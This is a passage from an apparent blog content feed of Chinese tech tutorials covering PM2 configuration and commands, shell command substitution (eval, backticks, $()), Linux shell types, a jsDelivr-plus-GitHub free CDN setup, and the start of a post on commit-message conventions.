class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  apps : [&#123;</span><br><span class="line">    name: &quot;myApp&quot;,</span><br><span class="line">    script: &#39;index.js&#39;,</span><br><span class="line">    watch: &#39;.&#39;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是<code>json</code>格式的配置文件，一个是<code>js</code>格式的配置文件。</p><p>上面是一个最简单的<code>processes.json</code>配置，创建了一个<code>myApp</code>应用，如果你有多个服务，那么<code>apps</code> 这个数组中创建多个应用。</p><blockquote><p>创建好配置文件之后，那么该如何启动呢？</p></blockquote><p>有两种方式：</p><ol><li>直接调用配置文件启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 start processes.json</span><br></pre></td></tr></table></figure><p>可以增加<code>--env</code>参数，来指定当前启动环境。</p><ol start="2"><li>通过<code>package.json</code> 配置文件，配置脚本启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; package.json</span><br><span class="line"></span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">    &quot;pm2&quot;: &quot;pm2 start processes.json&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后就可以直接使用<code>npm start pm2</code> 来启动应用了。</p><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。</p><p>PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。</p><table><thead><tr><th>字段</th><th>类型</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>string</td><td>myApp</td><td>应用的名字，默认是脚本文件名</td></tr><tr><td>cwd</td><td>string</td><td>/var/www/myApp</td><td>应用程序所在目录</td></tr><tr><td>script</td><td>string</td><td>./server.js</td><td>应用程序的脚本路径，相对于应用程序所在目录</td></tr><tr><td>log_date_format</td><td>string</td><td>YYYY-MM-DD HH:mm Z</td><td>日志时间格式</td></tr><tr><td>error_file</td><td>string</td><td>-</td><td>错误日志存放路径</td></tr><tr><td>out_file</td><td>string</td><td>-</td><td>输出日志存放路径</td></tr><tr><td>pid_file</td><td>string</td><td>-</td><td>pid文件路径</td></tr><tr><td>watch</td><td>boolean or array</td><td>true</td><td>当目录文件或子目录文件有变化时自动重新加载应用</td></tr><tr><td>ignore_watch</td><td>list</td><td>[”[/]./”, “node_modules”]</td><td>list中的正则匹配的文件和目录有变化时不重新加载应用</td></tr><tr><td>max_memory_restart</td><td>string</td><td>50M</td><td>当应用超过设定的内存大小就自动重启</td></tr><tr><td>min_uptime</td><td>string</td><td>60s</td><td>最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量</td></tr><tr><td>max_restarts</td><td>number</td><td>10</td><td>设置应用程序异常退出重启的次数，默认15次（从0开始计数）</td></tr><tr><td>instances</td><td>number</td><td>1</td><td>启动实例个数</td></tr><tr><td>cron_restart</td><td>string</td><td>1 0 * * *</td><td>定时重启</td></tr><tr><td>exec_interpreter</td><td>string</td><td>node</td><td>应用程序的脚本类型，默认是node</td></tr><tr><td>exec_mode</td><td>string</td><td>fork</td><td>应用启动模式，支持fork和cluster模式，默认为fork</td></tr><tr><td>autorestart</td><td>boolean</td><td>true</td><td>应用程序崩溃或退出时自动重启</td></tr></tbody></table><p>有以下几点需要注意 ⚠️：</p><ol><li>如果<code>processes.json</code>或者<code>ecosystem.config.js</code> 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。</li><li><code>cwd</code> 不要填绝对路径，建议用相对路径，<code>./</code>表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。</li></ol><h3 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h3><p>列出所有节点应用程序（进程/微服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 list</span><br><span class="line">$ pm2 ls</span><br></pre></td></tr></table></figure><p>可以将进程列表以JSON格式打印出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 jlist</span><br><span class="line">$ pm2 prettylist</span><br></pre></td></tr></table></figure><p>使用进程ID或名称查看所示的单个Node进程的详细信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 describe &lt;id | app_name&gt;</span><br><span class="line">$ pm2 show &lt;id | app_name&gt;</span><br></pre></td></tr></table></figure><p>实时监控所有进程CPU或内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 monit</span><br></pre></td></tr></table></figure><h3 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h3><p>查看某个应用的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs --json         # JSON 格式输出</span><br><span class="line">$ pm2 logs --format       # 格式化 output</span><br><span class="line">$ pm2 flush               # 清空所有日志文件</span><br><span class="line">$ pm2 reloadLogs          # 重新加载所有日志文件</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>停止进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stop [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 restart [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>0秒停机重载进程 (用于 NETWORKED 进程)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 reload all</span><br></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 delete [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><h3 id="使用PM2-运行-npm-start"><a href="#使用PM2-运行-npm-start" class="headerlink" title="使用PM2 运行 npm start"></a>使用PM2 运行 npm start</h3><p><code>npm run xxxx</code> 是 node常用的启动方式之一，那么如何使用<code>PM2</code>来实现对该方式的启动呢？</p><p><code>npm run</code>、<code>npm start</code>等命令之所以可以使用，是因为<code>package.json</code>配置文件中增加了对应的脚本命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;;</span><br></pre></td></tr></table></figure><p>其中 <code>--watch</code>监听代码变化，<code>--name</code>重命名任务名称，<code>-- run</code>后面跟脚本名字</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 等效于 npm start</span><br><span class="line">pm2 start npm --watch --name webserver -- run start</span><br></pre></td></tr></table></figure><h3 id="稳定运行"><a href="#稳定运行" class="headerlink" title="稳定运行"></a>稳定运行</h3><p>PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。</p><p>为了保证能够稳定运行，可以参考以下几点建议：</p><ol><li>应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况；</li><li>最大内存限制，根据观察设定合理内存限制，保证应用异常运行；</li><li><code>min_uptime</code>，<code>min_uptime</code> 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动；</li><li>设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题；</li><li>设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.kancloud.cn/daiji/pm2/395273" target="_blank" rel="noopener">pm2 从入门到精通</a></li><li><a href="https://www.linuxidc.com/Linux/2019-07/159432.htm" target="_blank" rel="noopener">如何在生产服务器上安装PM2运行Node.js应用程序</a></li><li><a href="https://futurestud.io/tutorials/pm2-advanced-app-configuration-with-json-file" target="_blank" rel="noopener">PM2 配置文件说明解析</a></li><li><a href="https://pm2.keymetrics.io/docs/usage/application-declaration/" target="_blank" rel="noopener">PM2 应用配置文件解析</a></li><li><a href="https://fynn90.github.io/2018/01/11/PM2%E5%AE%9E%E7%94%A8%E6%89%8B%E5%86%8C/#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 实用手册</a></li><li><a href="https://www.cnblogs.com/cangqinglang/p/10676162.html" target="_blank" rel="noopener">PM2 用法详解</a></li><li><a href="https://juejin.im/post/5b823506e51d4538d517662f#heading-5" target="_blank" rel="noopener">使用pm2 自动部署node项目</a></li><li><a href="https://blog.windstone.cc/back-end/node/pm2.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 中文文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> PM2 </tag>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中的eval、反引号、$()的区别</title>
      <link href="/the-difference-between-eval-and-backquotes-in-linux-and/"/>
      <url>/the-difference-between-eval-and-backquotes-in-linux-and/</url>
      
        <content type="html"><![CDATA[<p>之前在搭建 SSH 环境时，遇到了这样一个问题：</p><blockquote><p>使用命令：<code>eval$(ssh-agent)</code>去创建一个代理进程，但是会提示：<code>No Such file or directory</code> 。</p></blockquote><p>就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？</p><p>后来，了解到原来一直使用的 <code>eval$(ssh-agent)</code> ，其中的<code>$()</code> 原来在<code>Linux</code>中有特殊的意义。</p><p>所以这篇笔记专门用来了解 <code>eval</code> 和 <code>反引号</code> 以及 <code>$()</code>之间的区别。 它们的作用都是<strong>命令替换</strong>。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ &#96;ssh-agent&#96;</span><br><span class="line">sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory</span><br><span class="line"></span><br><span class="line">$ eval ssh-agent</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 1092;</span><br><span class="line"></span><br><span class="line">$ eval &#96;ssh-agent&#96;</span><br><span class="line">Agent pid 4288</span><br></pre></td></tr></table></figure><p>直到我输入 eval <code>ssh-agent</code> 时，似乎就对了。</p><h3 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h3><p>这三种不同的方式都是<code>shell</code>脚本中的命令代换。</p><p>命令代换是指<code>shell</code>能够将一个命令的标准输出插在一个命令行中任何位置。</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>首先要介绍的是: <code>eval</code></p><p>它的作用是：<strong>重新运算求出参数的内容</strong>。</p><p>该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ vim test.txt      </span><br><span class="line">&#x2F;&#x2F; 写入 Hello eval</span><br><span class="line"></span><br><span class="line">$ var&#x3D;&quot;cat test.txt&quot;</span><br><span class="line">&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。</span><br><span class="line"></span><br><span class="line">$ echo $var</span><br><span class="line">cat test.txt</span><br><span class="line">$ eval $var</span><br><span class="line">Hello eval</span><br></pre></td></tr></table></figure><h4 id="反引号与"><a href="#反引号与" class="headerlink" title="反引号与 $()"></a>反引号与 $()</h4><p>实例一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ DATE1&#x3D;$(date)</span><br><span class="line">$ DATE2&#x3D;&#96;date&#96;</span><br><span class="line">$ DATE3&#x3D;&#96;eval date&#96;</span><br><span class="line"></span><br><span class="line">$ echo $DATE1</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE2</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE3</span><br><span class="line">2019年01月23日 21:20:36</span><br></pre></td></tr></table></figure><p>实例二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#96;echo &#39;\\&#39;&#96; </span><br><span class="line">\</span><br><span class="line">$ echo $(echo &#39;\\&#39;)</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://kyle.io/2012/09/ssh-agent-messiness-solving-it/" target="_blank" rel="noopener">https://kyle.io/2012/09/ssh-agent-messiness-solving-it/</a></li><li><a href="https://blog.csdn.net/Y1730008223CONG/article/details/74136055" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别</a></li><li><a href="https://blog.csdn.net/if9600/article/details/74221548" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中的Shell 种类</title>
      <link href="/shell-types-in-linux/"/>
      <url>/shell-types-in-linux/</url>
      
        <content type="html"><![CDATA[<p>什么是Shell？</p><a id="more"></a><p>Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。</p><p>据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。</p><h2 id="Shell-的种类"><a href="#Shell-的种类" class="headerlink" title="Shell 的种类"></a>Shell 的种类</h2><p>Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。</p><p>POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。</p><p>通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;shells</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;bin&#x2F;posh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;posh</span><br></pre></td></tr></table></figure><p>如何查看当前正在使用的Shell 类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><code>$SHELL</code>是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。</p><p>用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入<code>zsh</code>可以直接输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。</p><h2 id="最标准的Shell"><a href="#最标准的Shell" class="headerlink" title="最标准的Shell"></a>最标准的Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p><code>sh</code>是Unix 上最古老的Shell，在<code>sh</code>的基础上添加了各种扩展功能的是<code>bash</code>，它成为Linux标准Shell。有如下的特点：</p><ul><li>使用上下键快速查看历史命令</li><li>Tab 键自动补全</li></ul><h2 id="其他Shell"><a href="#其他Shell" class="headerlink" title="其他Shell"></a>其他Shell</h2><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p><code>ash</code>是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。</p><h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p><code>csh</code>是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。</p><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p>zch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性：</p><ul><li>更好的自动补全、更高效</li><li>更好的文件名展开（通配符展开）</li><li>可定制性高</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://academy.gmocloud.com/keywords/20170324/4010" target="_blank" rel="noopener">什么是Shell以及常见Shell种类</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费 CDN：JsDelivr + Github</title>
      <link href="/free-cdn-jsdelivr-github/"/>
      <url>/free-cdn-jsdelivr-github/</url>
      
        <content type="html"><![CDATA[<p>不知道大家通常是如何访问图床的，我之前一直使用的方式是：<code>GitHub</code> 图床 + <code>raw.githubusercontent</code>。</p><p>图片相关的资源全部放在<code>GitHub</code>上，然后使用GitHub 提供的素材服务器<code>raw.githubusercontent</code>去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。</p><p>因此需要使用 CDN 来加速来优化资源加载速度。</p><a id="more"></a><h2 id="CDN-是什么"><a href="#CDN-是什么" class="headerlink" title="CDN 是什么"></a>CDN 是什么</h2><blockquote><p>CDN的全称是<code>Content Delivery Network</code>，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。<br>幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——<a href="https://www.jsdelivr.com/" target="_blank" rel="noopener">JsDelivr</a>。</p><h2 id="JsDelivr-是什么"><a href="#JsDelivr-是什么" class="headerlink" title="JsDelivr 是什么"></a>JsDelivr 是什么</h2><blockquote><p>A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网</p></blockquote><p>根据官网的介绍我们可以知道它是一个<strong>免费</strong>、<strong>快速</strong>、<strong>可靠</strong>、<strong>自动化</strong> 的CDN。</p><p>那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>JsDelivr 目前有三种用法：</p><ul><li>Npm</li><li>Github</li><li>Wordpress</li></ul><p>因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。</p><h3 id="1-新建Github-仓库"><a href="#1-新建Github-仓库" class="headerlink" title="1. 新建Github 仓库"></a>1. 新建Github 仓库</h3><p>这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。</p><h3 id="2-将本地资源推送至仓库"><a href="#2-将本地资源推送至仓库" class="headerlink" title="2. 将本地资源推送至仓库"></a>2. 将本地资源推送至仓库</h3><p>将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。</p><h3 id="3-发布仓库"><a href="#3-发布仓库" class="headerlink" title="3. 发布仓库"></a>3. 发布仓库</h3><p>如果没有发布就直接使用，可能会导致文件加载异常。</p><p>自定义发布版本号：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200710132805.png" alt=""></p><p>然后点击<code>Publish release</code>。</p><h3 id="4-通过jsDeliver引用资源"><a href="#4-通过jsDeliver引用资源" class="headerlink" title="4. 通过jsDeliver引用资源"></a>4. 通过jsDeliver引用资源</h3><p>只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。</p><p>规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>cdn.jsdelivr.net/gh/</code>：jsDeliver 规定Github 的引用地址</li><li><code>username</code>：你的GitHub 用户名</li><li><code>repository</code>：CDN 仓库</li><li><code>@version</code>：发布的版本号</li><li><code>file</code>：资源文件在仓库中的路径</li></ul><p>版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过指定版本号引用</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用一个范围内的版本</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 忽略版本号则默认使用最新版</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版</span><br><span class="line">&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>同样的一张图片，可以对比一下<code>jsDeliver</code>和<code>raw.githubusercontent</code> 的访问速度。</p><ul><li><code>jsDeliver</code>：<a href="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg</a></li><li><code>raw.githubusercontent</code>：<a href="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何写好Commit log</title>
      <link href="/how-to-write-a-commit-log/"/>
      <url>/how-to-write-a-commit-log/</url>
      
        <content type="html"><![CDATA[<p>其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。</p><p>这里就不过多介绍什么是<code>Git</code>了，本文的重点是<code>Commit Log</code>，如果还不清楚<code>Git</code>是什么，可以看一下我的<code>Git</code>系列的其他笔记。</p><a id="more"></a><h2 id="为什么要关注提交信息"><a href="#为什么要关注提交信息" class="headerlink" title="为什么要关注提交信息"></a>为什么要关注提交信息</h2><ol><li>加快<code>Reviewing Code</code>的过程</li><li>提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方</li><li>提高项目的整体质量</li></ol><h2 id="Angular-规范的-Commit-message-格式"><a href="#Angular-规范的-Commit-message-格式" class="headerlink" title="Angular 规范的 Commit message 格式"></a>Angular 规范的 Commit message 格式</h2><p>这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。</p><p>其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure><p>其中，Header 是必需的，Body 和 Footer 可以省略。</p><h3 id="Header"><a href="#Header" class="headerlink" 